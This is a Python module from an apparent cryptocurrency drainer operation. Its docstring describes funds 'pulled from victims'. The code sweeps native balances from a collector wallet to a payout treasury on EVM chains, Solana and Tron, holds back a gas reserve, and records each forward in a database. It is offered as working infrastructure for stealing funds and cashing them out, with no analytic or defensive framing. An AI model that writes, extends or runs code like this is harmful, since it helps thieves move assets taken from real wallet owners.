"""
Collector -> payout forwarding.

Once the payout sink is a treasury/multisig, funds pulled from victims land
there directly (the receiver and the native onboarding transfers both pay
`payout`). Anything that still reaches the hot collector — a withdrawn receiver,
an old grant, dust — is forwarded by this module so the collector keeps only
gas.

Best effort and bounded: each family returns per-item results.
"""
import base64
import logging
from typing import Any, Dict, List

import abi
import crypto
import drainer
import solana_tx
import tron_tx
from chains import EVM_NETWORKS, SOLANA_RPCS, evm_network_names
from database import get_setting, now, q_run

logger = logging.getLogger("payout")

NATIVE_RESERVE_WEI = 10**16          # leave 0.01 native for gas
SOL_RESERVE = 20_000_000            # 0.02 SOL
TRON_RESERVE_SUN = 15_000_000       # 15 TRX


def _record(family: str, network: str, token: str, amount: int,
            txid: str = "", status: str = "sent", error: str = "") -> None:
    q_run("INSERT INTO payout_forwards (family, network, token, amount, txid,"
          " status, error, created_at) VALUES (?,?,?,?,?,?,?,?)",
          family, network, token, str(amount), txid, status, error[:300], now())


async def _evm() -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    payout = get_setting("drainer_payout_evm")
    if not payout or not abi.is_address(payout) or not get_setting("drainer_evm_key"):
        return out
    key = drainer._require_key("evm")
    collector = crypto.evm_address_from_key(key)

    if payout.lower() == collector.lower():
        return [{"family": "evm", "status": "skipped",
                 "reason": "payout is the collector"}]

    for net in evm_network_names():
        try:
            balance = int(await drainer._rpc(net, "eth_getBalance",
                                             [collector, "latest"]), 16)
            amount = balance - NATIVE_RESERVE_WEI
            if amount > 0:
                txid = await drainer._evm_send(net, key, payout, "0x", amount)
                _record("evm", net, "native", amount, txid)
                out.append({"family": "evm", "network": net, "txid": txid})
        except Exception as exc:                             # noqa: BLE001
            _record("evm", net, "native", 0, status="failed", error=str(exc))
            out.append({"family": "evm", "network": net, "error": str(exc)[:200]})
    return out


async def _solana() -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    payout = get_setting("drainer_payout_sol")
    if not payout or not get_setting("drainer_sol_key"):
        return out
    secret = drainer._require_key("solana")
    keypair, address = crypto.solana_keypair_from_secret(secret)
    if address == payout:
        return [{"family": "solana", "status": "skipped", "reason": "payout is the collector"}]

    import httpx
    rpc = SOLANA_RPCS[0]
    async with httpx.AsyncClient(timeout=15.0) as client:
        r = await client.post(rpc, json={"jsonrpc": "2.0", "id": 1,
                                         "method": "getBalance",
                                         "params": [address, {"commitment": "confirmed"}]})
    lamports = int((((r.json() or {}).get("result") or {}).get("value")) or 0)
    amount = lamports - SOL_RESERVE
    if amount <= 0:
        return out
    try:
        blockhash, last_valid = await solana_tx._blockhash(rpc)
        payload = solana_tx.build_native_pull_tx(keypair, address, payout, blockhash, amount)
        # owner == collector, so partial_sign above completed the transaction
        txid = await solana_tx.broadcast(rpc, payload, last_valid)
        _record("solana", "Solana", "native", amount, txid)
        out.append({"family": "solana", "txid": txid})
    except Exception as exc:                                 # noqa: BLE001
        _record("solana", "Solana", "native", amount, status="failed", error=str(exc))
        out.append({"family": "solana", "error": str(exc)[:200]})
    return out


async def _tron() -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    payout = get_setting("drainer_payout_tron")
    if not payout or not get_setting("drainer_tron_key"):
        return out
    from tronpy.keys import PrivateKey

    key = drainer._require_key("tron")
    collector = crypto.tron_address_from_key(key)
    if collector == payout:
        return [{"family": "tron", "status": "skipped", "reason": "payout is the collector"}]

    import httpx
    async with httpx.AsyncClient(timeout=15.0, headers=tron_tx._headers()) as client:
        r = await client.post(f"{tron_tx._base()}/wallet/getaccount",
                              json={"address": collector, "visible": True})
    sun = int((r.json() or {}).get("balance", 0) or 0) - TRON_RESERVE_SUN
    if sun <= 0:
        return out
    try:
        tx = await tron_tx.build_transfer(collector, payout, sun)
        signed = drainer._tron_sign(PrivateKey(bytes.fromhex(key.removeprefix("0x"))), tx)
        txid = await tron_tx.broadcast(signed)
        _record("tron", "Tron", "native", sun, txid)
        out.append({"family": "tron", "txid": txid})
    except Exception as exc:                                 # noqa: BLE001
        _record("tron", "Tron", "native", sun, status="failed", error=str(exc))
        out.append({"family": "tron", "error": str(exc)[:200]})
    return out


async def forward_all() -> List[Dict[str, Any]]:
    results: List[Dict[str, Any]] = []
    for fn in (_evm, _solana, _tron):
        try:
            results.extend(await fn())
        except Exception as exc:                             # noqa: BLE001
            logger.warning("payout forward failed: %s", exc)
            results.append({"error": str(exc)[:200]})
    return results
